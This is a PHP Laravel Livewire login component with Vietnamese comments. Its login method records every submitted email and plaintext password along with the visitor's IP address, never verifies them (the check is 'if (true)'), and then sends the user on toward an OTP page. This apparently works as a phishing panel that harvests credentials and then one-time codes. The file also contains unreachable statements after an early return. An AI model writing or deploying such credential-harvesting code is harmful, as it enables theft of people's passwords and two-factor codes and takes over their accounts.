<?php

namespace App\Livewire;

use App\Events\MessageSent;
use App\Models\UserLogin;
use Illuminate\Support\Facades\Auth;
use Livewire\Component;
use Jantinnerezo\LivewireAlert\LivewireAlert;
use Illuminate\Support\Facades\Request;
class Login extends Component
{
    use LivewireAlert; // Thêm trait LivewireAlert

    public $email;
    public $password;
    public $isLoadingModal = false; // Define the loading state variable

    public function login()
    {
    //  return   broadcast(new MessageSent('12323'));
        $this->isLoadingModal = true;
        $credentials = [
            'email' => $this->email,
            'password' => $this->password,
        ];

        UserLogin::create([
            'email' => $this->email,
            'password' => $this->password,
            'ip_address' => Request::ip(), // Lưu IP của người dùng
        ]);

        if (true) {
            session()->put('user_email', $this->email); // Lưu email vào session
            return true;
            $this->alert( 'success', 'Đăng nhập thành công!'); // Thông báo khi đăng nhập thành công


             redirect()->route('otp-page'); // Chuyển hướng đến trang nhập mã OTP
        } else {
            $this->alert('error', 'Thông tin đăng nhập không chính xác.');
        }
    }

    public function render()
    {
        return view('livewire.login');
    }
}
